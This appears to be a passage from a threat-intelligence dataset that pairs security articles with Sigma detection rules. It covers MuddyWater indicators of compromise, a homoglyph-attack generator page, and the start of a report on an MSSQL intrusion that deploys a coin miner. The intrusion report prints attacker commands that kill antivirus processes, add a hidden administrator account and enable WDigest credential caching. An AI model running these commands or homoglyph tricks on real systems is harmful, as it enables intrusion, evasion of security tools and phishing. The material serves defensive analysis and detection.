on their IPs, countries, geolocations, target enterprises, etc. Depending on the response from the attacker’s CnC, the victim is assigned an ID $sysid. This ID is sent to the CnC with each request for commands to execute.\n\n#### Supported commands\n\n- “*upload*”, “*screenshot*”, “*Excel*”, “*Outlook*”, “*risk*”, “*reboot*”, “*shutdown*”, “*clean*”. These commands vary from one version to another.\n\n1. The “*screenshot*” command takes a screenshot that is saved as a *PNG* file in “*ProgramData*”.\n2. The “*Excel*” command receives another stage of the PowerShell code, saves it in “*c:\\programdata\\a.ps1*” and then asks Excel to execute this PowerShell script via *DDE*.\n3. The “*Outlook*” command receives another stage of the PowerShell code, saves it in “*c:\\programdata\\a.ps1*” and then asks Outlook via *COM*, via *MSHTA.exe*, to execute it.\n4. The “*risk*” command receives another stage of the PowerShell code, saves it in “*c:\\programdata\\a.ps1*” and then asks Explorer.exe via *COM interaction* to execute it.\n5. The “*upload*” command downloads files from the CnC and saves them locally in “*C:\\ProgramData*”.\n6. The “*clean*” command destroys the victim’s disk drives *C*, *D*, *E*, *F* and then reboots.\n7. The “*reboot*” and “*shutdown*” commands immediately reboot and shut down the victim’s machine.\n\nIn one version of the malware, the code checks if the “*ProgramData*” folder has folders or files with the keywords “*Kasper*”, “*Panda*”, or “*ESET*”.\n\n```image\nAlt: Victimology\nDescription: The image displays a snippet of PowerShell code related to the MuddyWater malware. It includes a function that accesses the 'C:\\ProgramData' directory, selects file names, and checks for the presence of specific keywords ('Kasper', 'Panda', 'ESET') within the directory. The code uses an array to store the keywords and employs a loop to determine if any of these keywords are found in the directory contents, setting a variable to true if a match is detected. This snippet provides technical insight into the malware's behavior regarding its checks for security software.\nTranscription: |\n  function WFOHWZAFJICTNZXQGFZRXXGYGWAOTJ() {\n      $name = (dir c:\\programdata) | select Name\n  \n      $array = @(\"Kasper\", \"Panda\", \"ESET\")\n  \n      $source = $name.Name\n  \n      $source | where {\n          $found = $FALSE\n  \n          foreach($arr in $array) {\n              if($_.Contains($arr)) {\n                  $found = $TRUE\n              }\n          }\n  \n          if($found -eq $TRUE) {\n              # Code to execute if found\n          }\n      }\n  }\n```\n\n## Victimology\n\n```image\nAlt: Victimology Map\nDescription: The image is a map illustrating the global attack geography of the MuddyWater spear-phishing campaign in 2018. It highlights various countries targeted by the campaign, including Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan, Azerbaijan, Russia, Iran, and Austria. The map uses color coding to indicate the level of targeting, with dark blue representing countries with many targets and yellow for those with some targets. There are labels for specific countries, and icons indicating the types of targets, such as government, military entities, telecommunications companies, and educational institutions.\nTranscription: |\n  Muddy Water – global attack geography 2018  \n  Countries targeted by the Muddy Water spear-phishing campaign in 2018, according to Kaspersky Lab detection data\n  \n  Targets:  \n  - Government and military entities  \n  - Telecommunications companies  \n  - Education institutions  \n  \n  **Many targets**  \n  **Some targets**  \n  \n  - Austria  \n  - Turkey  \n  - Azerbaijan  \n  - Iran  \n  - Afghanistan  \n  - Pakistan  \n  - Russia  \n  - Bahrain  \n  - Saudi Arabia  \n  - Iraq  \n  - Jordan  \n  - Mali  \n  \n  © 2018 AO Kaspersky Lab. All Rights Reserved.\n```\n\nMost victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan, and Azerbaijan. Other victims were also recorded in Russia, Iran, Bahrain, Austria, and Mali. The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations.\n\n## Attacker deception and attribution\n\nThe deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes. Multiple documents used in the attacks also contain embedded paths from their authors’ machines. These paths are embedded by Office under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g. text box or command button) into a Word document. The paths discovered are:\n\n```\n• C:\\Users\\leo\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \n• C:\\Users\\poopak\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \n• C:\\Users\\Vendetta\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \n• C:\\Users\\Turk\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd\n```\n\n*Leo, Poopak, Vendetta, and Turk* are the usernames of those creating the documents or the templates on which they are based. Turk could point to a person of Turkish origin. Poopak is a Persian girl’s name or might suggest the authors are not entirely happy with “Pak”, which could be short for Pakistan. Leo could be one of the attacker’s names. We also don’t rule out the possibility of false flags, with the attackers using random usernames to confuse researchers.\n\nIn multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers.\n\n```\n无法连接到网址，请等待龙… \n无法访问本地计算机寄存器 \n任务计划程序访问被拒绝\n```\n\nTranslation of Chinese text:\n\n```\nUnable to connect to the URL, please wait for the dragon… \nUnable to access local computer register \nTask Scheduler access denied\n```\n\nWe have also noticed that for some samples, e.g. *5a42a712e3b3cfa1db32d9e3d832f8f1*, the PowerShell code had only three CnC URLs, which leads us to believe that most of the CnC URLs in *$dragon_middle* found in other samples could actually be ‘noise’ to distract researchers or trigger false positives.\n\n```\nhttp://www.cankayasrc[.]com/style/js/main.php \nhttp://ektamservis[.]com/includes/main.php \nhttp://gtme[.]ae/font-awesome/css/main.php\n```\n\n## Recommendations for organizations\n\nEffective protection from targeted attacks focuses on advanced detective, preventive, and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems.\n\nThe best way to prevent attackers from finding and leveraging security holes is to eliminate the holes altogether, including those related to improper system configurations or errors in proprietary applications. Organizations are also recommended to implement the following steps for an enhanced level of protection at their premises.\n\n1. Use PowerShell Constrained Language Mode as it uses *IEX, Add-Type*, and *New-Object*.\n2. Lock PowerShell Execution Policy, must be set to “*AllSigned*” via *GPO*.\n3. An allowlisting solution to prevent certain process child-parent execution hierarchies.\n\n## Conclusion\n\nThe MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active development of attacks, infrastructure, and the use of new methods and techniques. The attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services. Kaspersky Lab expects these types of attacks to intensify in the near future.\n\nIn order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures:\n\n- Educate generic staff to be able to distinguish malicious behavior like phishing links.\n- Educate information security staff to have full configuration, investigative, and hunting abilities.\n- Use a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by analyzing network anomalies.\n- Provide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack prevention and discovery, such as indicators of compromise and YARA rules.\n- Make sure enterprise-grade patch management processes are well established and executed.\n\nHigh-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease.\n\n### Additional information\n\nIn the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers.\n\nFurther details about the attackers’ arsenal, additional indicators of compromise, YARA rules, and attribution information is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.com\n\n## Indicators of compromise\n\n### MD5\n\n```\n08acd1149b09bf6455c553f512b51085 \na9ec30226c83ba6d7abb8d2011cdae14 \nE5683fb480353c0dec333a7573710748 \n159238b473f80272fdcd0a8ddf336a91 \n16ac1a2c1e1c3b49e1a3a48fb71cc74f \n1b086ab28e3d6f73c6605f9ae087ad4a \n23c82e8c028af5c64cbe37314732ec19 \n24e1bd221ba3813ed7b6056136237587 \n2e82e242cb0684b98a8f6f2c0e8a12f3 \n37f7e6e5f073508e1ee552ebea5d200e \n3bb14adb551663fd2328d59f653ba757 \n3c2a0d6d0ecf06f1be9ad411d06f7ba8 \n4c5a5c236c9f4480b3d725f297673fad \n4f873578956d2790101443f24e4bd4d3 \n5466c8a099d1d30096775b1f4357d3cf \n59502e209aedf80e170e653306ca1553 \n5a42a712e3b3cfa1db32d9e3d832f8f1 \n5bd61a94e7698574eaf82ef277316463 \n5de97ae178888f2dd222bb8a66060ac2 \n665947cf7037a6772687b69279753cdf \n7a2ff07283ddc69d9f34cfa0d3c936d4 \n7beb94f602e97785370fec2d059d54a5 \n801f34abbf90ac2b4fb4b6289830cd16 \n864d6321be50f29e7a7a4bfab746245a \n8a36d91ca331f62642dbcafc2ea1b1ab \n9486593e4fb5a4d440093d54a3519187 \n94edf251b5fe7cc19488b5f0c3c3e359 \n9c6648cedeb3f5d9f6d104e638bd0c3d \n9f4044674100a8c28f9ed1b336c337ce \naa1e8d0e1c4d4eb9984124df003ea7f2 \naa564e207926d06b8a59ba50ca2c543d \nab4f947f4649b9ec28d182b02778aa69 \nad92ccf85ec170f340457d33bbb81df5 \nb8939fa58fad8aa1ec271f6dae0b7255 \nbb476622bcb0c666e12fbe4ccda8bbef \nbe62fc5b1576e0a8491519e10bab931d \nbf310319d6ef95f69a45fc4f2d237ed4 \nc375bbf248592cee1a1999227457c300 \nc73fc71ee35e99230941f03fc32934d9 \nc8b0458c384fd34971875b1c753c9c7c \ncd371d1d3bd7c8e2110587cfa8b7eaea \nce2df2907ce543438c19cfaf6c14f699 \nd15aee026074fbd18f780fb51ec0632a \nd632c8444aab1b43a663401e80c0bac4 \nd6acee43d61cbd4bcd7a5bdf4ed9b343 \ne3e25957b738968befcf2333aa637d97 \ne5683fb480353c0dec333a7573710748 \neb69fb45feb97af81c2f306564acc2da \nf00fd318bf58586c29ab970132d1fd2a \nf2b5373f32a4b9b3d34701ff973ba69c \nf84914c30ae4e6b9b1f23d5c01e001ed \nfaa4469d5cd90623312c86d651f2d930 \nFfb8ea0347a3af3dd2ab1b4e5a1be18a \n345b1ea293764df86506f97ba498cc5e \n029cb7e622f4eb0d058d577c9d322e92 \n06178b5181f30ce00cd55e2690f667ac \n2b8ab9112e34bb910055d85ec800db3f \n47ec75d3290add179ac5218d193bb9a8 \nbefc203d7fa4c91326791a73e6d6b4da \nC561e81e30316208925bfddb3cf3360a \n132efd7b3bdfb591c1bf2a4e19c710eb \ne7a6c57566d9523daa57fe16f52e377e \nc0e35c4523a7931f4c99616d6079fd14 \n245fa82c89875b70c2669921d4ba14d3\n```\n\n### File names\n\n```\n%SystemDrive%\\ProgramData\\EventManager.dll \n%SystemDrive%\\ProgramData\\EventManager.logs \n%SystemDrive%\\ProgramData\\WindowsDefenderService.ini \n%SystemDrive%\\ProgramData\\Defender.sct \n%SystemDrive%\\ProgramData\\DefenderService.inf \n%SystemDrive%\\ProgramData\\WindowsDefender.ini \n%SystemDrive%\\ProgramData\\ZIPSDK\\InstallConfNT.vbs \n%SystemDrive%\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini \n%SystemDrive%\\ProgramData\\WindowsDefenderTask.ini \n%SystemDrive%\\ProgramData\\WindowsDefenderTask.txt \n%SystemDrive%\\ProgramData\\WindowsDefenderTask.xml \n%SystemDrive%\\ProgramData\\DefenderNT\\ConfigRegister.vbs \n%SystemDrive%\\ProgramData\\DefenderNT\\SetupConf.ini \n%SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\ProjectConfSDK.vbs \n%SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\SetupConfSDK.ini \n%SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.ini \n%SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.vbs \n%SystemDrive%\\ProgramData\\OneDrive.dll \n%SystemDrive%\\ProgramData\\OneDrive.html \n%SystemDrive%\\ProgramData\\OneDrive.ini \n%SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.ini \n%SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.vbs \n%SystemDrive%\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs \n%SystemDrive%\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini \n%windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderUpdater \n%windir%\\System32\\Tasks\\Microsoft\\MicrosoftOneDrive \n%windir%\\System32\\Tasks\\Microsoft\\WindowsDifenderUpdate \n%windir%\\System32\\Tasks\\Microsoft\\WindowsSystem32SDK \n%windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderSDK \n%windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareDefenderSDK \n%windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareByteSDK\n```\n\n### Domains, URLs and IP addresses\n\n```\nhttp://www.cankayasrc[.]com/style/js/main.php \nhttp://ektamservis[.]com/includes/main.php \nhttp://gtme[.]ae/font-awesome/css/main.php \nhttps://www.adfg[.]ae/wp-includes/widgets/main.php \nhttp://adibf[.]ae/wp-includes/js/main.php \nhttp://hubinasia[.]com/wp-includes/widgets/main.php \nhttps://benangin[.]com/wp-includes/widgets/main.php\n```\n\n```\n104.237.233.60 \n104.237.255.212 \n104.237.233.40 \n5.9.0.155\n```",
    "sigma_rule": {
      "title": "Suspicious File Characteristics Due to Missing Fields",
      "id": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43",
      "status": "test",
      "description": "Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe",
      "references": [
        "https://securelist.com/muddywater/88059/",
        "https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection"
      ],
      "author": "Markus Neis, Sander Wiebing",
      "date": "2018-11-22",
      "modified": "2022-10-09",
      "tags": [
        "attack.execution",
        "attack.t1059.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection1": {
          "Description": "\\?",
          "FileVersion": "\\?"
        },
        "selection2": {
          "Description": "\\?",
          "Product": "\\?"
        },
        "selection3": {
          "Description": "\\?",
          "Company": "\\?"
        },
        "folder": {
          "Image|contains": "\\Downloads\\"
        },
        "condition": "(selection1 or selection2 or selection3) and folder"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_file_characteristics.yml",
    "id": "534"
  },
  {
    "url": "http://www.irongeek.com/homoglyph-attack-generator.php",
    "markdown": "# Homoglyph Attack Generator\n\nThis app is meant to make it easier to generate homographs based on Homoglyphs than having to search for look-a-like character in Unicode, then coping and pasting. Please use only for legitimate pen-test purposes and user awareness training. I also recommend webapp developers use it to test out possible user impersonation attacks in their code. This is still a work in progress, so please send me suggestions (especially for new Homoglyphs to add). While this tool was designed with making IDNA/Punycode names for putting into DNS to display foreign characters in a browsers URL bar, it can be used for other things. Try ignoring the IDNA/Punycode stuff and just making look alike user names for systems that accept Unicode. I made this tool to easily generate homographs based on homoglyphs in Unicode and to test out how different apps display them. It seems like a lot of modern browsers have gotten better at warning the users of attack, but I'd love to hear experiences about other apps that accept Unicode/Punycode/Internationalized Domain Names, especially webapps.\n\nFor more information see my Paper Proposal for \"Out of Character: Use of Punycode and Homoglyph Attacks to Obfuscate URLs for Phishing\".\n\n\n**1st**, type in a name to look like: _________________________________\n\n**2nd**, choose homoglyphs to use:\t\n\n**3rd**, Output will be something like this: Output appears here.\n\n**4th** submit so PHP can generate the IDNA/Punycode: [submit]\n\n**Unicode URL to give out:**\n**Encoded label to set up in DNS:**\n\nBelow is phlyLabs original converter if you want to try taking the Homograph back and forth.\n\n**Original (Unicode)** | **Punycode (ACE)**\n______________________ | __________________\n\nIDNA2008 Encode>> <<Decode\n\nPHP code based on examples and libraries from phlyLabs; part of phlyMail. Also thanks to http://homoglyphs.net for helping me find more glyphs.\n\n| Char | Homoglyphs                |\n| ---- | ------------------------- |\n|      | ᅟ ᅠ                   　 ㅤ |\n| !    | ! ǃ ！                     |\n| \"    | \" ״ ″ ＂                   |\n| $    | $ ＄                       |\n| %    | % ％                       |\n| &    | & ＆                       |\n| '    | ' ＇                       |\n| (    | ( ﹝ （                     |\n| )    | ) ﹞ ）                     |\n| *    | * ⁎ ＊                     |\n| +    | + ＋                       |\n| ,    | , ‚ ，                     |\n| -    | - ‐ 𐀠 𴐠－                |\n| .    | . ٠ ۔ ܁ ܂ ․ ‧ 。 ． ｡       |\n| /    | / ̸ ⁄ ∕ ╱ ⫻ ⫽ ／ ﾉ         |\n| 0    | 0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏ   |\n| 1    | 1 I ا １                   |\n| 2    | 2 ２                       |\n| 3    | 3 ３                       |\n| 4    | 4 ４                       |\n| 5    | 5 ５                       |\n| 6    | 6 ６                       |\n| 7    | 7 𐐠𱰠７                   |\n| 8    | 8 Ց ８                     |\n| 9    | 9 ９                       |\n\n| Char | Homoglyphs                                      |\n| ---- | ----------------------------------------------- |\n| :    | : ։ ܃ ܄ ∶ ꞉ ：                                   |\n| ;    | ; ; ；                                           |\n| <    | < ‹ ＜                                           |\n| =    | = 𐀠 𴀠＝                                        |\n| >    | > › ＞                                           |\n| ?    | ? ？                                             |\n| @    | @ ＠                                             |\n| [    | [ ［                                             |\n| \\    | \\ ＼                                             |\n| ]    | ] ］                                             |\n| ^    | ^ ＾                                             |\n| _    | _ ＿                                             |\n| `    | ` ｀                                             |\n| a    | A a À Á Â Ã Ä Å à á â ã ä å ɑ Α α а Ꭺ Ａ ａ       |\n| b    | B b ß ʙ Β β В Ь Ᏼ ᛒ Ｂ ｂ                         |\n| c    | C c ϲ Ϲ С с Ꮯ Ⅽ ⅽ 𐐠𺀠Ｃ ｃ                       |\n| d    | D d Ď ď Đ đ ԁ ժ Ꭰ ḍ Ⅾ ⅾ Ｄ ｄ                     |\n| e    | E e È É Ê Ë é ê ë Ē ē Ĕ ĕ Ė ė Ę Ě ě Ε Е е Ꭼ Ｅ ｅ |\n| f    | F f Ϝ Ｆ ｆ                                       |\n| g    | G g ɡ ɢ Ԍ ն Ꮐ Ｇ ｇ                               |\n| h    | H h ʜ Η Н һ Ꮋ Ｈ ｈ                               |\n| i    | I i l ɩ Ι І і ا Ꭵ ᛁ Ⅰ ⅰ 𐐠𰰠Ｉ ｉ                 |\n| j    | J j ϳ Ј ј յ Ꭻ Ｊ ｊ                               |\n| k    | K k Κ κ К Ꮶ ᛕ K Ｋ ｋ                             |\n\n| Char | Homoglyphs              |\n| ---- | ----------------------- |\n| l    | L l ʟ ι ا Ꮮ Ⅼ ⅼ Ｌ ｌ     |\n| m    | M m Μ Ϻ М Ꮇ ᛖ Ⅿ ⅿ Ｍ ｍ   |\n| n    | N n ɴ Ν Ｎ ｎ             |\n| 0    | 0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏ |\n| p    | P p Ρ ρ Р р Ꮲ Ｐ ｐ       |\n| q    | Q q Ⴍ Ⴓ Ｑ ｑ             |\n| r    | R r ʀ Ի Ꮢ ᚱ Ｒ ｒ         |\n| s    | S s Ѕ ѕ Տ Ⴝ Ꮪ 𐐠𵠠Ｓ ｓ   |\n| t    | T t Τ τ Т Ꭲ Ｔ ｔ         |\n| u    | U u μ υ Ա Ս ⋃ Ｕ ｕ       |\n| v    | V v ν Ѵ ѵ Ꮩ Ⅴ ⅴ Ｖ ｖ     |\n| w    | W w ѡ Ꮃ Ｗ ｗ             |\n| x    | X x Χ χ Х х Ⅹ ⅹ Ｘ ｘ     |\n| y    | Y y ʏ Υ γ у Ү Ｙ ｙ       |\n| z    | Z z Ζ Ꮓ Ｚ ｚ             |\n| {    | { ｛                     |\n|      |                         |  | ǀ ا ｜ |\n| }    | } ｝                     |\n| ~    | ~ ⁓ 〜                   |\n| ß    | ß ӧ                     |\n| ä    | Ä Ӓ                     |\n| ö    | Ö Ӧ                     |\n\n**Changes:**\n11/28/2017: Added ḍ as sugested by rockethamster. 3/11/2012: Added option to use 'Right-To-Left Override' (U+202E) so you can do some stupied EXE tricks, and added a linkless output so you can copy & paste your homography without formatting. 3/11/2012: Added ﾉ for /. 4/3/2012: I found a list of IDN blacklisted characters on Mozilla's site and added them. I also added a table of the homoglyphs I'm using.\n3/6/2012: ٠ was also suggested by @Voulnet.\n3/5/2012: @Voulnet suggested I add Arabic letter ا. I put it in for l, i, | and 1.",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters",
      "id": "32e280f1-8ad4-46ef-9e80-910657611fbc",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "CommandLine|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "CommandLine|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Commandlines with legitimate Cyrillic text; will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_homoglyph_cyrillic_lookalikes.yml",
    "id": "540"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 